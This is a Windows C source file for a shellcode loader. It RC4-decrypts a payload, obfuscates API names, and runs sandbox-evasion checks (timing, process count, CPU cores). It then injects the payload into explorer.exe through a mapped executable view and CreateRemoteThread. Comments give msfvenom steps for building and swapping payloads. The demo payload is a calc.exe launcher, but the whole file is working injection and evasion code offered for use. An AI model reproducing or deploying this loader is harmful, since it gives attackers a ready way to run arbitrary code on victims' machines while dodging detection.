#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <Tlhelp32.h>
#pragma comment (lib, "OneCore.lib")	    

typedef HANDLE(WINAPI* CreateRemoteThreadFunc)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);

CreateRemoteThreadFunc NotCreateRemoteThread;
char k_dll_name[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0 };
char NotCreateRemoteThreadName[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0 };

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);

BOOL RC4DEC(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
	NTSTATUS	STATUS = NULL;
	USTRING	Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },Img = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };
	char a_dll_name[] = { 'A','d','v','a','p','i','3','2',0 };
	char NotSysFunc32[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2',0 };
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(a_dll_name), NotSysFunc32);

	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
		return FALSE;
	}
	return TRUE;
}
BOOL MpInj(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL		bSTATE = TRUE;
	HANDLE		hFile = NULL;
	PVOID		pMapLocalAddress = NULL,pMapRemoteAddress = NULL;

	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

_EndOfFunction:
	*ppAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}

BOOL RemoteHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
	HANDLE			hSnapShot = NULL;
	PROCESSENTRY32	Proc = { .dwSize = sizeof(PROCESSENTRY32)};
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		goto _EndOfFunction;
	}

	if (!Process32First(hSnapShot, &Proc)) {
		goto _EndOfFunction;
	}

	do {
		WCHAR LowerName[MAX_PATH * 2];
		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;
			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				LowerName[i++] = '\0';
			}
		}

		if (wcscmp(LowerName, szProcessName) == 0) {
			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				break;
		}
	} while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
	FreeConsole();

	// sleep for 5 seconds and count the ticks
	Sleep(5000);
	ULONG* PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
	LONG* PUserSharedData_High1Time = (PLONG)0x7ffe0324;
	ULONG* PUserSharedData_LowPart = (PULONG)0x7ffe0320;
	DWORD time = GetTickCount64();
	DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
		((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
	if ((time - kernelTime) > 5 && (kernelTime - time) > 5) return 69;

	// check number of running process on system
	DWORD runningProcessesIDs[1024];
	DWORD runningProcessesCountBytes;
	DWORD runningProcessesCount;
	EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
	runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
	if (runningProcessesCount < 20) return 69;

	// check number of CPU cores
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2) return 69;

	HANDLE		hProcess = NULL,hThread = NULL;
	PVOID		pAddress = NULL;
	DWORD		dwProcessId = NULL;
	

	// msfvenom -p windows/x64/exec cmd=calc.exe exitfunc=thread -f raw -o calc.bin
	// python3 rc4.py calc.bin
	// replace Payload and Key variables with the output
	// ==================================================================================================================
	// !!!  don't forget to use the exitfunc=thread option, otherwise, the thread will terminate explorer.exe on exit !!!
	//===================================================================================================================
	
	unsigned char Payload[] = {
			0x19, 0x80, 0x34, 0xF3, 0xD7, 0xB8, 0xF8, 0xF1,
	0x49, 0x42, 0xD2, 0xBD, 0x3A, 0xE5, 0x18, 0xB1,
			0x3E, 0x05, 0x39, 0x4E, 0xD8, 0xD6, 0x4C, 0x7B,
	0xE1, 0x34, 0x39, 0xDE, 0xC0, 0xBA, 0x57, 0x7F,
			0x63, 0x09, 0x57, 0xCE, 0xAA, 0xD5, 0x2C, 0x89,
	0x9D, 0x5B, 0xCA, 0x69, 0x0A, 0xB3, 0x20, 0xDC,
			0x07, 0x03, 0x92, 0x5D, 0x24, 0x04, 0x5C, 0x7A,
	0x6B, 0xFF, 0xA8, 0xD3, 0x3D, 0xAE, 0x07, 0x8C,
			0xAB, 0xB3, 0x6C, 0xF8, 0xEE, 0x61, 0x97, 0x1D,
	0x81, 0x98, 0x71, 0xF8, 0x18, 0x4F, 0xAD, 0x21,
			0xBE, 0xC8, 0x17, 0x35, 0x19, 0x43, 0xC2, 0x43,
	0xF5, 0xF6, 0x66, 0x18, 0xD6, 0x65, 0xE4, 0x51,
			0x62, 0xDF, 0x6F, 0x35, 0x74, 0x5E, 0x8B, 0xD7,
	0xD9, 0x0F, 0x5D, 0x70, 0xF1, 0x6C, 0xE5, 0x4C,
			0x31, 0x33, 0x9B, 0xB3, 0xF3, 0x03, 0xE9, 0x7D,
	0x46, 0x2D, 0x08, 0x3D, 0x62, 0x7E, 0x26, 0xE9,
			0x6D, 0xAC, 0xD5, 0xFE, 0xFB, 0xA9, 0x3F, 0x5E,
	0xB6, 0x0C, 0x4B, 0x64, 0x14, 0xF9, 0x4D, 0x2E,
			0x0E, 0x42, 0x6F, 0xA3, 0xFB, 0xEE, 0x2B, 0x39,
	0xD1, 0xF0, 0x3E, 0x6D, 0x21, 0xC4, 0x57, 0x70,
			0xE9, 0x16, 0xE3, 0x20, 0xE0, 0x1D, 0x71, 0x81,
	0x3A, 0x3C, 0xF4, 0x25, 0x25, 0x5E, 0xDD, 0x86,
			0xCF, 0x80, 0x4B, 0x15, 0x73, 0x4C, 0x59, 0xCF,
	0x5B, 0x54, 0x41, 0x8B, 0xA7, 0x90, 0x75, 0xA8,
			0xA9, 0x3C, 0x26, 0x59, 0x09, 0xDB, 0xE7, 0x9E,
	0x7A, 0x20, 0x97, 0x95, 0x3E, 0xC4, 0xF1, 0x8F,
			0x04, 0xE1, 0x3D, 0x04, 0xB1, 0x56, 0x95, 0xA3,
	0x96, 0x3E, 0x9B, 0x7F, 0x0E, 0x4E, 0xA9, 0x63,
			0x41, 0x24, 0x9A, 0xEC, 0x57, 0x0E, 0x26, 0x10,
	0x73, 0xB0, 0x60, 0x94, 0x01, 0x8C, 0x1C, 0x90,
			0x5C, 0x93, 0x33, 0xB0, 0x17, 0x0F, 0xCA, 0xC8,
	0x8F, 0xD5, 0xEF, 0xA8, 0xC4, 0xCB, 0xD9, 0x58,
			0x4D, 0x0A, 0xE7, 0xD6, 0xC3, 0xD6, 0x78, 0xDA,
	0x94, 0x26, 0x32, 0x1B, 0xD0, 0xD7, 0x45, 0x13,
			0x87, 0x72, 0x51, 0x80,
	};

	unsigned char Key[] = {
			0x24, 0x41, 0x66, 0x96, 0x64, 0xDD, 0xF9, 0x46,
			0xA6, 0xF6, 0xD1, 0x5C, 0x91, 0xFF, 0xC0, 0x7C,
	};

	RC4DEC(Key, Payload, sizeof(Key), sizeof(Payload));

	if (!RemoteHandle(L"explorer.exe", &dwProcessId, &hProcess)) {
		return -1;
	}

	if (!MpInj(hProcess, Payload, sizeof(Payload), &pAddress)) {
		return -1;
	}
	NotCreateRemoteThread = GetProcAddress(GetModuleHandleA(k_dll_name), NotCreateRemoteThreadName);

	hThread = NotCreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread == NULL)
		return 0;
}